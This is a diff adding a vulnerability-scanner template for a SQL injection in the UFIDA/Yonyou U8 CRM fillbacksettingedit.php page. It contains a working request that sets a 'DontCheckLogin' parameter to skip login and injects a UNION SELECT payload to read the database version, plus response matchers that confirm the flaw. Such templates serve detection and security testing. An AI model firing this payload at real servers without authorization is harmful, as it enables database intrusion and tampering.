@@ -1,0 +1,29 @@
+id: yonyou-u8-crm-sqli
+brief:
+    title: UFIDA U8 CRM cfillbacksetting.php - SQL Injection
+    by: s4e-io
+    level: high
+    about: UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting ...
+    label:
+        - yonyou
+        - u8-crm
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+'
+      head:
+        Cookie: PHPSESSID=bgsesstimeout-;
+      signs:
+        - "on": word
+          has:
+            - src_obj_type":"businesInfo","src_fld
+          in: body
+        - "on": word
+          has:
+            - src_fld":null
+          in: body
+        - "on": status
+          status:
+            - 200
